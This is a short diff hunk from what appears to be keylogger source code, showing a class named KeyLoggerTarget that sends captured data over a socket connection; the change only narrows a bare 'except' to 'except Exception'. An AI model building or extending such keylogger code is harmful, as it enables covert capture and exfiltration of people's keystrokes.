@@ -57,7 +57,7 @@ class KeyLoggerTarget:
 
 				try:
 					self.connection.socket_stream.send(data)
-				except:
+				except Exception:
 					self.connection.socket_stream.close()
 					self.connection.socket_interact.close()
 					break
